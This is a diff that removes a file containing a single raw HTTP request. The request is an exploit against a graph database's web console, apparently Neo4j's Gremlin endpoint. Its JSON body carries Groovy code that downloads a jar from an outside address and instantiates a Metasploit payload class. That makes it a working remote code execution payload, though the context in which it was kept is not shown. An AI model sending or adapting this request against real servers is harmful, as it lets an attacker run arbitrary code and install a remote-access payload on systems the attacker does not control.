@@ -1,8 +1,0 @@
-POST /db/manage/server/console/ HTTP/1.1
-Host: localhost:7474
-Content-Type: application/json
-Content-Length: 221
-
-{"command":"URL url=new URL(\"http://192.168.239.1/~alvaro/met239.jar\");def urlList = [] << url;URL[] urls = urlList.toArray();new URLClassLoader(urls).loadClass(\"metasploit.Payload\").newInstance()","engine":"gremlin"}
-
-
